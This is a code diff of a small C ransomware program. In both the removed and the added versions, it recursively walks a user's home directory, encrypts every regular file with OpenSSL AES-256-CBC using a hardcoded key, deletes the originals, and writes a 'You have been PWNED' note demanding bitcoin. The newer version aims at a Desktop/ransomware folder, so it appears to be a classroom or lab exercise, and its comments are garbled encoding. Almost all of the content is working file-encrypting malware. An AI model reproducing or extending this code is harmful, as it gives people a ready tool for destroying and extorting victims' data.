@@ -1,130 +1,160 @@
-#include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <pwd.h>
+#include <string.h>
 #include <dirent.h>
 #include <openssl/evp.h>
 #include <openssl/aes.h>
 
-
 void ls_dir(char* start_path);
 void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
 
-
 int main()
 {
-   
-	
-	char* start_path;										  //start_path¶ó´Â charÇü Æ÷ÀÎÅÍ¸¸µë
-	start_path = "/home/";  //±×¾È¿¡ /home/ À» ³ÖÀ½
+    
+    char* start_path;
+    char* home;
+    char* uid;
+    uid_t user_id;
+   	struct passwd *user_pw;
+    
+    struct passwd *lpwd;
+    printf("UID    : %d\n",getuid());
+    printf("EUID   : %d\n" ,geteuid());
+    
+    //lpwd = getpwuid(getuid());
+    //printf("UNAME  : %s\n", lpwd->pw_name);
+    
+    lpwd = getpwuid(geteuid());
+    printf("EUNAME : %s\n", lpwd->pw_name);
+    
+    
+    home = "/home/";
+   	//user_id = lpwd->pw_name;
+    start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
+    strcpy(start_path, home);
+    strcat(start_path, lpwd->pw_name);
+    strcat(start_path, "/Desktop/ransomware/");
+    printf("%s", start_path);
+    
     ls_dir(start_path);
-
+    
     return 0;
 }
 
-void ls_dir(char* start_path)// ls_dirÀº charÇü Æ÷ÀÎÅÍ¸¦ ÇÏ³ª¹Ş¾Æ¼­ ¹İÈ¯¾øÀ½
+void ls_dir(char* start_path)
 {
-	unsigned char key[] = "12345678901234561234567890123456";	   // 32 char 256bit key ºÎÈ£¾ø´Â charÇü º¯¼ö·Î key¹è¿­ ¸¸µé°í ±×¾È¿¡ ¹®ÀÚ32°³³ÖÀ½
-    unsigned char iv[] = "1234567890123456";					   //same size as block 16 char 128 bit block ºÎÈ£¾ø´Â charÇü º¯¼ö·Î iv¹è¿­¸¸µé°í ±×¾È¿¡ ¹®ÀÚ 16°³³ÖÀ½  
-
-	DIR* dir;											   //dirent.h¿¡ ÀÖ´Â dir±¸Á¶Ã¼·Î dirÆ÷ÀÎÅÍ ¼±¾ğ
-	struct dirent *ent;									   //*dirent °³¹æÇÑ ÆÄÀÏÀÇ Á¤º¸¸¦ ÀúÀåÇÒ ±¸Á¶Ã¼ º¯¼ö
-	if((dir=opendir(start_path)) !=NULL)					  //start_path(/home/)À» ¿­°í dir¿¡ ³Ö´Â´Ù ¼º°øÇØ¼­ NULLÀÌ ¾Æ´Ñ°ªÀÌ ¹İÈ¯‰ç´Ù¸é if¹®ÁøÀÔ
-	{
-		while((ent=readdir(dir)) !=NULL)					   //¿¬ µğ·ºÅä¸®¸¦ ÀĞ¾î¼­ ent¿¡ ³ÖÀ½
-		{
-			int len = strlen(ent->d_name);				   //µğ·ºÅä¸®ÀÇ ÀÌ¸§ÀÇ ±æÀÌ len¿¡ ÀúÀå
-			const char* last_four = &ent->d_name[len-4];		   //¸¶Áö¸· È®ÀåÀÚ¸¦ °¡Á®¿Í ³ÖÀ½
-			if(strcmp(last_four,".enc") != 0)				   //¸¸¾à È®ÀåÀÚ°¡ .enc°¡ ¾Æ´Ï¸é ÁøÀÔ
-			{
-				if(ent->d_type == 8)					   //regÆÄÀÏÀÌ¸é
-				{
-					char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);		//char¸¦ ¸¸µé¾î¼­ ·£¼¶¿ş¾îÁ¤º¸ÀÇ ±æÀÌ¿Í /home/+2¸¸Å­ µ¿ÀûÇÒ´ç
-					strcpy(full_path_readme,start_path);						  //¸¸µç°Å¿¡ /home/³Ö°í
-					strcat(full_path_readme,"RANSOMEWARE_INFO");					  //·£¼¶¿ş¾îÁ¤º¸¸¦ µÚ¿¡ºÙÀÓ
-					char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);	//full_path¶ó´Â°É »õ·Î¸¸µé°í Æú´õ¸í+/home/+2¸¸Å­ µ¿ÀûÇÒ´ç
-					strcpy(full_path,start_path);				  ///home/³Ö°í
-					strcat(full_path,ent->d_name);			  //±×µÚ¿¡ Æú´õ¸í³ÖÀ½
-					char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);	 //new_name¸¸µé°í /home/Æú´õ¸í + .enc+1¸¸Å­ µ¿ÀûÇÒ´ç
-					strcpy(new_name,full_path);							   //full_path³Ö°í
-					strcat(new_name,".enc");						 //.enc³ÖÀ½
-					if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)  
-					{		 //¸¸¾à full_path°¡ /etc/passwd¿Í ´Ù¸£°í /etc/shadowµµ ¾Æ´Ï°í etc/sudoersµµ ¾Æ´Ï¸é
-						FILE* fpin;	   
-						FILE* fpout;
-						FILE* fpreadme;
-					
-						
-						fpin=fopen(full_path,"rb");		   //full_path¸¦ (/home/Æú´õ¸í)À» ¹ÙÀÌ³Ê¸®ÆÄÀÏ·Î ÀĞ±âÀ§ÇØ ¿¬´Ù
-						fpout=fopen(new_name,"wb");		   //new_nameÀ»(/home/Æú´õ¸í.enc ¸¦ ¾²±âÀ§ÇØ ¹ÙÀÌ³Ê¸®ÆÄÀÏ·Î¿¬´Ù 
-						fpreadme=fopen(full_path_readme,"w");	//full_path_readme¸¦ ¾²±âÀ§ÇØ¿¬´Ù.   
-						
-						fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
-						fclose(fpreadme);			//fpreadme¿¡ ¿ä±¸ÇÏ´Â»çÇ×À» ¾²°í ´İ´Â´Ù.
-						
-						encryptfile(fpin,fpout,key,iv);
-
-						fclose(fpin);
-						fclose(fpout);
-						remove(full_path);
-					}
-					free(full_path);
-					free(new_name);
-				}
-				else if(ent->d_type==4)			 //ÆÄÀÏÀÌ dirÀÌ¸é
-				{
-
-					char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
-					strcpy(full_path,start_path);
-					strcat(full_path,ent->d_name);
-					strcat(full_path,"/");
-					printf("%s\n",full_path);
-					if(full_path != start_path && ent->d_name[0] != '.')
-					{
-						ls_dir(full_path);
-					}
-					
-					free(full_path);
-
-
-				}
-
-			}
-		}
-	}
-
+    unsigned char key[] = "12345678901234561234567890123456";                                               //32 char 256bit key
+    unsigned char iv[] = "1234567890123456";                                                                //same size as block 16 char 128 bit block, init vector: ì•Œê³ ë¦¬ì¦˜ ìˆ˜í–‰ ì‹œ ë„£ëŠ” ê°’
+    //int full_path_readme_count = 0;
+    
+    DIR* dir;                                                                                                   //dir = opendir(start_path)ì˜ ë°˜í™˜ê°’ì„ ê°€ì§
+    struct dirent *ent;                                                                                         //ent = ê°œë°©í•œ íŒŒì¼(readdir(dir))ì˜ ì •ë³´ë¥¼ ì €ì¥í•  êµ¬ì¡°ì²´ ë³€ìˆ˜
+    if((dir=opendir(start_path)) !=NULL)
+        //if((dir=opendir(test_path)) !=NULL)
+    {
+        //full_path_readme_count = 0;
+        while((ent=readdir(dir)) !=NULL)
+        {
+            int len = strlen(ent->d_name);
+            const char* last_four = &ent->d_name[len-4];
+            if(strcmp(last_four,".enc") != 0)                                                                   //0: ì¼ì¹˜, ì•”í˜¸í™” íŒŒì¼ì˜ í™•ì¥ì: .enc
+            {
+                if(ent->d_type == 8)                                                                            // DT_REG == this is a regular file
+                {
+                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);    // full_path_readme = '/home/RANSOMEWARE_INFO\n'
+                    strcpy(full_path_readme,start_path);                                                        // full_path_readme = ' '/home/' '
+                    strcat(full_path_readme,"RANSOMEWARE_INFO");                                                // full_path_readme = ' '/home/' + 'RANSOMEWARE_INFO\n'
+                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);                  // full_path = '/home/ent->d_name'
+                    strcpy(full_path,start_path);
+                    strcat(full_path,ent->d_name);                                                              // ?
+                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);                        // new_name = full_path.enc
+                    strcpy(new_name,full_path);
+                    strcat(new_name,".enc");
+                    
+                    //printf("%d - %s\n", /***/ent->d_type, /***/new_name);
+                    
+                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)   //?
+                    {
+                        FILE* fpin;     //path
+                        FILE* fpout;    //file name
+                        FILE* fpreadme; //file RANSOMEWARE_INFO.(txt?)
+                        
+                        fpin=fopen(full_path,"rb");
+                        fpout=fopen(new_name,"wb");
+                        
+                        fpreadme=fopen(full_path_readme,"w");                                                   //? in the all directory?
+                        fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
+                        fclose(fpreadme);
+                        //full_path_readme_count++;
+                        
+                        encryptfile(fpin,fpout,key,iv);                                                         //encryption
+                        
+                        fclose(fpin);
+                        fclose(fpout);
+                        
+                        remove(full_path);
+                    }
+                    free(full_path);
+                    free(new_name);
+                }
+                else if(ent->d_type==4)                                                                         //DT_DIR == this is a directory file
+                {
+                    char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
+                    strcpy(full_path,start_path);                                                               // full_path_readme = ' '/home/' '
+                    strcat(full_path,ent->d_name);                                                              // full_path = '/home/ent->d_name'
+                    strcat(full_path,"/");                                                                      // full_path = '/home/ent->d_name'
+                    //printf("%d - ", /***/ent->d_type);
+                    printf("%s\n",full_path);
+                    if(full_path != start_path && ent->d_name[0] != '.')
+                    {
+                        ls_dir(full_path);                                                                      // ?
+                    }
+                    
+                    free(full_path);
+                }
+            }
+            //printf("full_path_readme_count: %d", &full_path_readme_count);
+        }
+    }
 }
-void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
+
+void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
 {
-	//Using openssl EVP to encrypt a file
-
-	
-	const unsigned bufsize = 4096;				 
-	unsigned char* read_buf = malloc(bufsize);
-	unsigned char* cipher_buf ;
-	unsigned blocksize;
-	int out_len;
-
-	EVP_CIPHER_CTX ctx;
-
-	EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);			//AES256 ¾ÏÈ£È­»ç¿ëÇØ¼­ ÄÁÅØ½ºÅ© ctx¿¡ ¾ÏÈ£È­ ÃÊ±âÈ­
-	blocksize = EVP_CIPHER_CTX_block_size(&ctx);			    //EVP_CIPHER_CTX±¸Á¶¸¦ Àü´ŞÇÒ ¶§ ¾ÏÈ£ÀÇ ºí·Ï Å©±â¹İÈ¯
-	cipher_buf = malloc(bufsize+blocksize);				    //cipher_buf¿¡ 4096+ºí·°»çÀÌÁî µ¿ÀûÇÒ´ç
-
-	// read file and write encrypted file until eof
-	while(1)
-	{
-		int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);		   //fpin(full_path)¿¡¼­ ÀĞ¾î¿Â´Ù. µ¥ÀÌÅÍ ÇÏ³ªÀÇÅ©±â´Â u.c, bufsize(4096)°³ÀĞÀ½, read_buf ¿¡ µ¥ÀÌÅÍÀÔ·Â , µ¥ÀÌÅÍ ¼ö(buf_size)¸¸Å­ ¹İÈ¯
-		EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);			   //¹öÆÛ¿¡¼­ ¾ÏÈ£È­ÇÏ°í ¾ÏÈ£È­µÈ¹öÀüÀ» out¿¡¾´´Ù.
-		fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);				   //fpout¿¡ ¾´´Ù. out_len±æÀÌ¸¸Å­, µ¥ÀÌÅÍÇÏ³ªÀÇÅ©±â´Â u.c, cipher_buf¿¡ ÀÖ´Â ³»¿ëÀ»
-		if(bytes_read < bufsize)
-		{
-			break;//EOF
-		}
-	}
-
-	EVP_CipherFinal(&ctx,cipher_buf,&out_len);
-	fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
-
-	free(cipher_buf);
-	free(read_buf);
+    //Using openssl EVP to encrypt a file
+    
+    const unsigned bufsize = 4096;
+    unsigned char* read_buf = malloc(bufsize);
+    unsigned char* cipher_buf ;
+    unsigned blocksize;
+    int out_len;
+    
+    EVP_CIPHER_CTX ctx;
+    
+    //init: ì•”í˜¸í™” ê´€ë ¨ ì •ë³´ ì„¤ì •(ì•”í˜¸í™” ë°©ì‹, í‚¤ ê¸¸ì´, ë¹„ë°€ ë²ˆí˜¸ ë“±)
+    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);                //int EVP_CipherInit(EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type, unsigned char *key, unsigned char *iv, int enc);
+    blocksize = EVP_CIPHER_CTX_block_size(&ctx);                    //EVP_CIPHER_CTX_block_size() return the block size
+    cipher_buf = malloc(bufsize+blocksize);
+    
+    // read file and write encrypted file until eof
+    while(1)
+    {
+        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);    //return the count(bufsize): ë°˜ë³µíšŸìˆ˜,size_t fread(void* buffer, size_t size, size_t count, FILE* stream)
+        //update: ì„¤ì •í•œ ì•”í˜¸í™” ë°©ì‹ìœ¼ë¡œ ë¸”ëŸ­ì„ ë¶„í• í•´ ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰, ECB CBC ëª¨ë“œ ì¤‘ cbc ëª¨ë“œ ì‚¬ìš©
+        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);        //int EVP_CipherUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, unsigned char *in, int inl);
+        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);                 //size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream): ë²„í¼ì— ì €ì¥ëœ ë°ì´í„°ë¥¼ íŒŒì¼ì— ì¶œë ¥
+        if(bytes_read < bufsize)
+        {
+            break;//EOF
+        }
+    }
+    
+    //final: ì…ë ¥í•œ plain textì˜ í¬ê¸°ê°€ ë¸”ëŸ­ì˜ ë°°ìˆ˜ê°€ ì•„ë‹ ê²½ìš° ë°ì´í„° ëì— ì—¬ë¶„ì˜ ë°ì´í„° ë°”ì´íŠ¸ê°€ ë‚¨ê²Œ ë˜ëŠ” í•´ë‹¹ ë°”ì´íŠ¸ë¥¼ íŒ¨ë”©í•˜ì—¬ ì²˜ë¦¬ê°€ëŠ¥í•œ í¬ê¸°ì˜ ë¸”ëŸ­ìœ¼ë¡œ ë§Œë“  ë‹¤ìŒ ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰
+    EVP_CipherFinal(&ctx,cipher_buf,&out_len);
+    fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
+    
+    free(cipher_buf);
+    free(read_buf);
 }
